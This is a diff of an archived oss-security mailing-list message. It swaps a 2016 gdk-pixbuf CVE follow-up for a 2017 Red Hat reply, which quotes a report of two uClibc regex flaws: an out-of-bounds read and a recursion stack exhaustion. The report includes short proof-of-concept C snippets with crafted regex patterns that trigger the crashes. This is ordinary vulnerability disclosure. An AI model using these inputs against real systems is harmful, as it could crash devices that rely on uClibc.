@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["897" "Monday" "16" "May" "2016" "09:53:24" "+0200" "Salvatore Bonaccorso" "carnil@debian.org" "<20160516075324.GA10354@eldamar.local>" "25" "Re: [oss-security] CVE Request: gdk-pixbuf: Additional fixes to protect against overlows in pixops_* functions (similar to CVE-2015-7674)" nil nil nil "5" "2016051607:53:24" "[oss-security] CVE Request: gdk-pixbuf: Additional fixes to protect against overlows in pixops_* functions (similar to CVE-2015-7674)" (number mark "U       carnil@debia May 16   25/897   " thread-indent "\"Re: [oss-security] CVE Request: gdk-pixbuf: Additional fixes to protect against overlows in pixops_* functions (similar to CVE-2015-7674)\"\n") "<20160512092302.GA13770@lorien.valinor.li>" ("<20160512092302.GA13770@lorien.valinor.li>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["4108" "Friday" "16" "June" "2017" "08:15:59" "+0200" "Andrej Nemec" "anemec@redhat.com" "<0271829c-ec94-244b-21db-d8804d6ace1a@redhat.com>" "146" "Re: [oss-security] two vulns in uClibc-0.9.33.2" "^Date:" nil nil "6" "2017061606:15:59" "[oss-security] two vulns in uClibc-0.9.33.2" (number mark "        anemec@redha Jun 16  146/4108  " thread-indent "\"Re: [oss-security] two vulns in uClibc-0.9.33.2\"\n") "<tencent_18C312B86EA079DA42B11D83@qq.com>" ("<tencent_18C312B86EA079DA42B11D83@qq.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 21614 invoked by uid 550); 16 May 2016 07:53:38 -0000
+Received: (qmail 30144 invoked by uid 550); 16 Jun 2017 06:16:11 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,70 +11,171 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 21586 invoked from network); 16 May 2016 07:53:37 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20120113;
-        h=sender:date:from:to:cc:subject:message-id:references:mime-version
-         :content-disposition:in-reply-to:user-agent;
-        bh=yEozTwbfwcxU+NQPPXreq78MPMOcAf91YDgh22yGbcY=;
-        b=p+G/MPKXBvmrdJt5YuRcEts1X+aMLELixhCXAVJIDjBl3toFsHXZS3ahLXOv7nM3jw
-         NUv0iTXuf8zQT6vFpNmZRgsSj5r/jGR+hSWDpx2n7fxgQ3gFST8FX387zjeQQnarx3rO
-         J7VuDwSBRLf0LlbIZtl9gtUi+mEmx8y4hz4lZrP259cOcNFSFljr8MmmlPTfzwjkUlcZ
-         4gbN8HAAMO3PrSBWACxFxPUXAv4IJ8EygLIB4VkXeplfzKIVOR2xo+s4DyJDFl+ny6hO
-         IPIN324E+nJeGt1JFepsqie8Bz7Oe/MLTYC0xsPa712YPArg8vfk5xp28H8nUeMXY87I
-         X0cQ==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20130820;
-        h=x-gm-message-state:sender:date:from:to:cc:subject:message-id
-         :references:mime-version:content-disposition:in-reply-to:user-agent;
-        bh=yEozTwbfwcxU+NQPPXreq78MPMOcAf91YDgh22yGbcY=;
-        b=LZ86JuBzjD7wLJns8VIo+ks8fr6HH9oZpXcFCuHj8TS7JxOnd8s/wa8CfYVtk0972U
-         AvqU5ASav5dnFIHAOAOzWsmm2Ux8uXIzGJXA/utyGHI5FvPB4vQCqwBWrUpC7zIiUY6G
-         rf8d+9a5fmK5PdI1pIyQlm1RlO3FVO5nNTNbh30ZjFdYT6i2zG+1yv4hqUkoThFOhLuF
-         qMajHf8kzmdSlPeyeSwFY/degmdnFQVpM7yRFhanL1tJcPI4sr+r0fSxE5GEiK8nYwba
-         8vSf8bzMlNFEa2ajrmpUXKj7gSRoNymnLPa2gTJuVyQeDcXM9YfcWax+kaLw/++mO1tf
-         R6GA==
-X-Gm-Message-State: AOPr4FUkn/Rx4RLKn4YqcAdc3hvXVgXVmpd4bqMueJ1qIaol8ppCBBcBH3e+wrCTjXb+ug==
-X-Received: by 10.194.26.41 with SMTP id i9mr31843686wjg.114.1463385206314;
-        Mon, 16 May 2016 00:53:26 -0700 (PDT)
-Sender: Salvatore Bonaccorso <salvatore.bonaccorso@gmail.com>
-Date: Mon, 16 May 2016 09:53:24 +0200
-From: Salvatore Bonaccorso <carnil@debian.org>
-To: oss-security@lists.openwall.com
-Cc: CVE Assignments MITRE <cve-assign@mitre.org>
-Message-ID: <20160516075324.GA10354@eldamar.local>
-References: <20160512092302.GA13770@lorien.valinor.li>
+Received: (qmail 30126 invoked from network); 16 Jun 2017 06:16:11 -0000
+DMARC-Filter: OpenDMARC Filter v1.3.2 mx1.redhat.com F067085541
+Authentication-Results: ext-mx04.extmail.prod.ext.phx2.redhat.com; dmarc=none (p=none dis=none) header.from=redhat.com
+Authentication-Results: ext-mx04.extmail.prod.ext.phx2.redhat.com; spf=pass smtp.mailfrom=anemec@redhat.com
+DKIM-Filter: OpenDKIM Filter v2.11.0 mx1.redhat.com F067085541
+References: <tencent_18C312B86EA079DA42B11D83@qq.com>
+Message-ID: <0271829c-ec94-244b-21db-d8804d6ace1a@redhat.com>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
+ Thunderbird/45.8.0
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <20160512092302.GA13770@lorien.valinor.li>
-User-Agent: Mutt/1.6.0 (2016-04-01)
-Subject: Re: [oss-security] CVE Request: gdk-pixbuf: Additional fixes to
- protect against overlows in pixops_* functions (similar to CVE-2015-7674)
+In-Reply-To: <tencent_18C312B86EA079DA42B11D83@qq.com>
+Content-Type: multipart/signed; micalg=pgp-sha512;
+ protocol="application/pgp-signature";
+ boundary="0VtDB7LtMwjk0iRTRnC2isLMIWOFU61jc"
+X-Scanned-By: MIMEDefang 2.79 on 10.5.11.16
+X-Greylist: Sender IP whitelisted, not delayed by milter-greylist-4.5.16 (mx1.redhat.com [10.5.110.28]); Fri, 16 Jun 2017 06:15:59 +0000 (UTC)
+Date: Fri, 16 Jun 2017 08:15:59 +0200
+From: Andrej Nemec <anemec@redhat.com>
+Reply-To: oss-security@lists.openwall.com
+Subject: Re: [oss-security] two vulns in uClibc-0.9.33.2
+To: oss-security@lists.openwall.com
 
-Hi,
+--0VtDB7LtMwjk0iRTRnC2isLMIWOFU61jc
+Content-Type: multipart/mixed; boundary="Rg3KPuNsOFv1sqCwpSxAmsHaXrh3W3VVG";
+ protected-headers="v1"
+From: Andrej Nemec <anemec@redhat.com>
+To: oss-security@lists.openwall.com
+Message-ID: <0271829c-ec94-244b-21db-d8804d6ace1a@redhat.com>
+Subject: Re: [oss-security] two vulns in uClibc-0.9.33.2
+References: <tencent_18C312B86EA079DA42B11D83@qq.com>
+In-Reply-To: <tencent_18C312B86EA079DA42B11D83@qq.com>
 
-On Thu, May 12, 2016 at 11:23:02AM +0200, Salvatore Bonaccorso wrote:
-> Hi
-> 
-> CVE-2015-7674, an interger overflow flaw in the pixops_scale_nearest
-> function, was fixed by
-> 
-> https://git.gnome.org/browse/gdk-pixbuf/commit/?id=e9a5704edaa9aee9498f1fbf6e1b70fcce2e55aa
-> 
-> There is another commit in the gdk-pixbuf repository to fix overflows
-> in the pixops_composite_nearest, pixops_composite_color_nearest and
-> pixops_process functions:
-> 
-> https://git.gnome.org/browse/gdk-pixbuf/commit/?id=dbfe8f70471864818bf458a39c8a99640895bd22
-> 
-> Can you aassing an additional CVE for this since the scope for
-> CVE-2015-7674 was for the pixops_scale_nearest function?
+--Rg3KPuNsOFv1sqCwpSxAmsHaXrh3W3VVG
+Content-Type: text/plain; charset=windows-1252
+Content-Transfer-Encoding: quoted-printable
 
-I realise I did not made that clear: The two commits were not fixed in
-the same release, the initial one resulting in CVE-2015-7674 is
-contained in 2.32.1, wereas the second commit came later in 2.33.1.
+Hello,
 
-Regards,
-Salvatore
+Unfortunately, CVE assignments are not done through this list anymore.
+You need to visit [1] and request the CVEs by filing out the form. Could
+you please look at it and let the list know about the assigned CVEs?
+
+Thanks!
+
+[1] https://cveform.mitre.org/
+
+Best Regards,
+
+--=20
+Andrej Nemec, Red Hat Product Security
+3701 3214 E472 A9C3 EFBE 8A63 8904 44A1 D57B 6DDA
+
+
+On 06/16/2017 05:53 AM, fefe wrote:
+> I found two vulns in  uClibc-0.9.33.2 (https://uclibc.org/)
+>
+>
+> one is about line 2682 of get_subexp.c :
+>
+>
+> 		if (BE (bkref_str_off >=3D mctx->input.valid_len, 0))
+> 		{
+> 		  /* If we are at the end of the input, we cannot match.  */
+> 		  if (bkref_str_off >=3D mctx->input.len)
+> 		    break;
+>
+>
+> 		  err =3D extend_buffers (mctx);
+> 		  if (BE (err !=3D REG1_NOERROR, 0))
+> 		    return err;
+>
+>
+> 		  buf =3D (const char *) re_string_get_buffer (&mctx->input);
+> 		}
+> 	      if (buf [bkref_str_off++] !=3D buf[sl_str - 1])
+> 		break; /* We don't need to search this sub expression
+>=20=09=09
+> "bkref_str_off >=3D mctx->input.valid_len" , when  bkref_str_off =3D=3D m=
+ctx->input.valid_len, "buf [bkref_str_off++] !=3D buf[sl_str - 1]" case Out=
+ of one bit bounds read
+>
+>
+> The poc code like:
+>=20=09
+> 	if(regcomp (&regtmp,"(.+)upper\\1^", REG_EXTENDED|REG_ICASE | REG_NOSUB =
+)=3D=3D0)
+> 	{=09=09
+>         	reg1match_t pmatch[1];
+> 		regexec(&regtmp, "upperupperupperx",1, pmatch, 0);
+> 		regfree(&regtmp);
+> 	}
+>
+>
+>
+>
+>
+>
+> The another is aout line 1837 of regexce.c :
+>
+>
+> 		check_dst_limits_calc_pos_1 (const re_match_context_t *mctx, int bounda=
+ries,
+> 			     int subexp_idx, int from_node, int bkref_idx)
+>                 .......
+>
+>
+> 		  cpos =3D
+> 		    check_dst_limits_calc_pos_1 (mctx, boundaries, subexp_idx,
+> 						 dst, bkref_idx);
+>
+>
+>=20=09=09
+> check_dst_limits_calc_pos_1 recursive calls case DDOS, because of stack e=
+xhaustion.
+>
+>
+> The poc code like:=09
+>=20=09
+> 	if(regcomp (&regtmp,"\x28\x2E\x3F\x3F\x28\x2E\x3F\x29\x5C\x42\x44\x3F\x3=
+F\x28\x2E\x5C\x32\x29\x2A\x5C\x32\x28\x2E\x3F\x29\x5C\x32\x29\x2A\x5C\x32\x=
+BD", REG_EXTENDED|REG_ICASE | REG_NOSUB )=3D=3D0)
+> 	{=09=09
+>         	reg1match_t pmatch[1];
+> 		regexec(&regtmp, "\x72\xFF\xFF\xFF\xFF\xBD",1, pmatch, 0);
+> 		regfree(&regtmp);
+> 	}
+>
+>
+>
+>
+> A large number of embedded devices uses uclibc instead of glibc.
+> Could you assign CVE id for those?
+>
+>
+> Thank you
+>
+>
+> Benjin Liu
+> Codesafe Team of Qihoo 360
+
+
+
+--Rg3KPuNsOFv1sqCwpSxAmsHaXrh3W3VVG--
+
+--0VtDB7LtMwjk0iRTRnC2isLMIWOFU61jc
+Content-Type: application/pgp-signature; name="signature.asc"
+Content-Description: OpenPGP digital signature
+Content-Disposition: attachment; filename="signature.asc"
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v2
+
+iQIcBAEBCgAGBQJZQ3efAAoJEIkERKHVe23a9YsP/3SNWm47HeJjGNWax8Zv8W80
+gLAfTU+gjY/StI7VTVvCEo80htVyFpfz/6rEF5AWzsDre9EIbPv6hBImZT0uTfSv
+cdsP0FsAgFak5gV8GvVySz7yfHbgoCWmc+uirRpnIJJ///ecfrdInhAaN1xRYbMY
+Qo4Ok/BO9vPspnqCU4wN2Cuw9rhAIEpHdL7sUUhq4m86SCg7gbbNS6HKQKZhIzzW
+41vIocYaPyjnDZp+bBzEkDphsNzQM7PXGc4qFu7rsCPJCLlet//GnmCFe5yywrHq
+/nnkDrO+1uqXBOF5iiEOZPo8LIPv0udUoPk1mNzZoUPi/HHNCvSpK58YWckhoozS
+od+MNUbvRWvjQJVRiYY96PLICUf2wOBD7f9et868o1mKRWUHEil95ZySmWKP+Ffd
+D6w/t7fsNAZiN0BhbANNZxc3Q+daw9lLrF10g//6iYm9Wffv/4Am3lSNtiZNruFf
+MGV4TVXyMutr9WPVij59lSq3g8Jzdge1i/dujI75hAb+LTx3AkVdCc6LjhmXh40l
+5rv4dq0r9jMqAy7gaTZ21j7qMHjdNyVG7KIJJe52cuak8CrX7gubUqWEpJ/MctVs
+xqcfvdsv1UVUFg4QcGil6keyYL2IXGrvVevRCGmBBQXI+AuR2jecGPn0CRDUAShU
+BFPm2XuvMHzjV4ctjIDc
+=atQJ
+-----END PGP SIGNATURE-----
+
+--0VtDB7LtMwjk0iRTRnC2isLMIWOFU61jc--
